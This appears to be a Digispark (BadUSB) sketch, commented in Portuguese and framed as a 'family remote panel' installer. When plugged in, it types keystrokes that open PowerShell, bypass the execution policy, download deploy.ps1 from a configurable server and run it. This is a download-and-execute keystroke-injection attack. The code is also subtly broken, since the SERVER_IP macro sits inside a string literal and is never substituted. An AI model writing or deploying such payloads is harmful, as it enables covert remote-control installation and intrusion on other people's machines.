// Digispark Deploy - Painel Remoto Familiar
// Ao plugar, instala o painel no PC automaticamente
//
// INSTRUCOES:
// 1. Rode server.py no seu PC principal
// 2. Substitua SEU_IP_AQUI pelo IP do seu PC na rede
// 3. Compile e grave no Digispark

#include "DigiKeyboard.h"

#define SERVER_IP "SEU_IP_AQUI"

void setup() {
  DigiKeyboard.delay(3000);

  // Abre PowerShell
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.press(KEY_ENTER);
  DigiKeyboard.releaseAll();
  DigiKeyboard.delay(1000);

  // Baixa e executa o script de deploy
  DigiKeyboard.print("Set-ExecutionPolicy Bypass -Scope Process -Force;");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("$s=New-Object Net.WebClient;");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("$s.DownloadFile('http://SERVER_IP:8080/deploy.ps1','C:\\temp_deploy.ps1');");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -File C:\\temp_deploy.ps1");
  DigiKeyboard.delay(200);
  DigiKeyboard.press(KEY_ENTER);
  DigiKeyboard.releaseAll();
}

void loop() {
}
